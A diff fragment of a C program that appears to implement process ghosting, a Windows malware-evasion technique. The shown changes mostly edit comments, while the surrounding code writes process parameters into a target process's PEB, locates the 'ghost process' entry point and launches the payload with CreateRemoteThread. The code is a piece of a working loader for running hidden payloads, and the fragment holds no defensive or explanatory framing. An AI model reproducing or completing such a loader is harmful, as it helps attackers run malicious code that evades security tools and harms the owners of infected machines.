@@ -185,7 +185,9 @@ int main ( int argc, char* argv[] )
 	MSG( "Populated process parameters structure at 0x%p", ProcessParameters );
 
 	/* 
-		Step 9: Calculate the total 
+		Step 9: Calculate the total amount of space required by process parameters structure.
+				Alignment must be preserved so parameters are allocated at same addr in local & remote
+				process
 	*/
 	Base = ( unsigned long long )ProcessParameters;
 	End = ( unsigned long long )ProcessParameters + ProcessParameters->Length;
@@ -203,7 +205,7 @@ int main ( int argc, char* argv[] )
 	Total = End - Base;
 	
 	/* 
-		Step 10: Write the  RTL_USER_PROCESS_PARAMETERS structure to the target process peb
+		Step 10: Write the RTL_USER_PROCESS_PARAMETERS structure to the target process peb
 	*/
 	if ( !VirtualAllocEx( hProcess, ( void * )ProcessParameters, Total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) )
 	{
@@ -244,6 +246,10 @@ int main ( int argc, char* argv[] )
 		API_FPUTS( "ReadProcessMemory", "Could not get a copy of the remote peb" );
 	}
 	MSG( "Retrieved ghost process entry point: 0x%I64X", ( unsigned long long )RemotePeb.ImageBaseAddress + PayloadNtHeader->OptionalHeader.AddressOfEntryPoint );
+
+	/*
+		Step 13: Execute the payload
+	*/
 
 	if ( !CreateRemoteThread( hProcess, 0, 0, ( LPTHREAD_START_ROUTINE )( ( unsigned long long )RemotePeb.ImageBaseAddress + PayloadNtHeader->OptionalHeader.AddressOfEntryPoint ), 0, 0, &ulThreadId ) )
 	{
